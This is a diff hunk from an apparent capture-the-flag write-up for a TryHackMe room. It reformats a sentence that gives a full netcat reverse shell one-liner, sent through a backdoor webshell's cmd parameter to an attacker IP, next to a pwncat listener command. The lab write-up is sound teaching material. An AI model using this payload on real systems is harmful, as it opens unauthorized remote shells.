@@ -487,7 +487,7 @@ From the attacker machine, I could access the RCE backdoor webshell by providing
 > Note - Even though we get a 403 Forbidden page, there are high chances some directories/files can still be accessed by directly visiting the endpoint containing the file/directory. The files/directories can be found by brute forcing! 
 > In our case, we got to know about the backdoor web shell via Wireshark packet capture.
 
-Now in the `&cmd=` parameter I used the following reverse shell payload (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.105.88 8888 >/tmp/f`) to get a shell as www-data(which also had gid of h4cked).
+Now in the `&cmd=` parameter I used the following reverse shell payload - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.105.88 8888 >/tmp/f` to get a shell as www-data(which also had **gid of h4cked**).
 
 ```bash
 sh3bu@Ubuntu:~/thm/whyhackme$ pwncat-cs -lp 8888
